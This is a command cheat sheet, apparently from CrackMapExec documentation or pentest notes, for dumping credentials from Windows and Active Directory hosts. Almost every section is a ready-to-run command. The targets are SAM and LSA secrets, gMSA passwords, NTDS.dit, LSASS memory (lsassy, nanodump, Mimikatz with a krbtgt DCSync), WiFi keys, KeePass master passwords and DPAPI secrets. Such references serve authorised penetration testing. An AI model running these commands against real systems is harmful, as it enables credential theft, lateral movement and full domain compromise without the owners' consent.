Dump SAM
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam

Dump LSA
Requires Domain Admin or Local Admin Priviledges on target Domain Controller
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa

Dump gMSA
Extract gmsa credentials accounts
Using the protocol LDAP you can extract the password of a gMSA account if you have the right.
LDAPS is required to retrieve the password, using the --gmsa LDAPS is automatically selected
$ crackmapexec ldap <ip> -u <user> -p <pass> --gmsa

Dump NTDS.dit
Requires Domain Admin or Local Admin Priviledges on target Domain Controller
2 methods are available:   
(default) 	drsuapi -  Uses drsuapi RPC interface create a handle, trigger replication, and combined with   
						additional drsuapi calls to convert the resultant linked-lists into readable format  
			vss - Uses the Volume Shadow copy Service  
			
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users --enabled
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
You can also DCSYNC with the computer account of the DC

Dump LSASS
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
Using Lsassy
#~ cme smb 192.168.255.131 -u administrator -p pass -M lsassy

Using nanodump
Using the module nanodump you can dump remotely the credentials 
#~ cme smb 192.168.255.131 -u administrator -p pass -M nanodump

Using Mimikatz (deprecated)
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
Using the module Mimikatz, the powershell script Invoke-mimikatz.ps1 will be executed on the remote target
#~ cme smb 192.168.255.131 -u administrator -p pass -M mimikatz
#~ cme smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"

Dump WIFI password
Get the WIFI password register in Windows
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
cme smb <ip> -u user -p pass -M wireless

Dump KeePass
You can check if keepass is installed on the target computer and then steal the master password and decrypt the database !
$ crackmapexec smb <ip> -u user -p pass -M keepass_discover
$ crackmapexec smb <ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"

Dump DPAPI
Dump DPAPI credentials using CrackMapExec
You can dump DPAPI credentials using CrackMapExec using the following option --dpapi
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
$ crackmapexec smb <ip> -u user -p password --dpapi






